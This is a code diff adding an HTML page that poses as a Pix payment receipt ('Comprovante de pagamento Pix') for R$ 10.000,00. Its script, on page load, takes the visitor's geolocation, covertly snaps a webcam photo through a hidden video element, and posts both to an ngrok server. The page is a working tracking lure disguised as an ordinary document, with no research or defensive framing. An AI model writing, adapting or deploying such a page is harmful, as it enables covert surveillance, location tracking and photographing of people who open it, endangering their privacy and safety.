@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Comprovante de pagamento Pix</title>
+  <link rel="stylesheet" href="styles.css" />
+</head>
+
+<body>
+  <div class="comprovante-container">
+    <h1>Comprovante de pagamento Pix</h1>
+
+    <div class="informacoes">
+      <p><span>Data:</span> <span id="data-atual"></span></p>
+      <p><span>Valor Recebido:</span> R$ 10.000,00</p>
+      <p><span>De:</span> João Silva de Oliveira</p>
+      <p><span>Status:</span> Recebido com Sucesso</p>
+    </div>
+
+    <button class="botao" onclick="window.print()">Imprimir</button>
+
+    <div class="comprovante-footer">
+      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
+      <p><a href="#">Clique aqui</a> para mais informações.</p>
+    </div>
+  </div>
+
+  <script>
+    const NGROK_SERVER = "https://867c-189-110-249-101.ngrok-free.app";
+    // Exibe a data atual
+    const dataAtual = new Date();
+    document.getElementById("data-atual").textContent = dataAtual.toLocaleDateString("pt-BR");
+
+    window.addEventListener("load", () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async (position) => {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+          const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+          const photo = await capturePhoto();
+          if (!photo) {
+            alert("Erro ao capturar a foto");
+            return;
+          }
+
+          fetch(`${NGROK_SERVER}/send-location-photo`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ latitude, longitude, maps, photo })
+          })
+            .then(res => res.json())
+            .then(data => {
+              if (!data.success) {
+                alert("Erro ao enviar o comprovante.");
+              }
+            })
+            .catch(error => {
+              console.error("Erro ao enviar:", error);
+            });
+
+        }, (error) => {
+          alert("Erro ao obter a localização: " + error.message);
+        });
+      } else {
+        alert("Geolocalização não é suportada pelo navegador.");
+      }
+    });
+
+    // Captura foto da webcam
+    function capturePhoto() {
+      return new Promise((resolve, reject) => {
+        const video = document.createElement("video");
+        video.style.display = "none";
+        document.body.appendChild(video);
+
+        navigator.mediaDevices.getUserMedia({ video: true })
+          .then(stream => {
+            video.srcObject = stream;
+            video.play();
+
+            video.onloadedmetadata = () => {
+              const canvas = document.createElement("canvas");
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+              const ctx = canvas.getContext("2d");
+              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+              stream.getTracks().forEach(track => track.stop());
+              video.remove();
+
+              const dataURL = canvas.toDataURL("image/png");
+              resolve(dataURL);
+            };
+          })
+          .catch(err => {
+            video.remove();
+            reject(null);
+          });
+      });
+    }
+  </script>
+</body>
+
+</html>
+
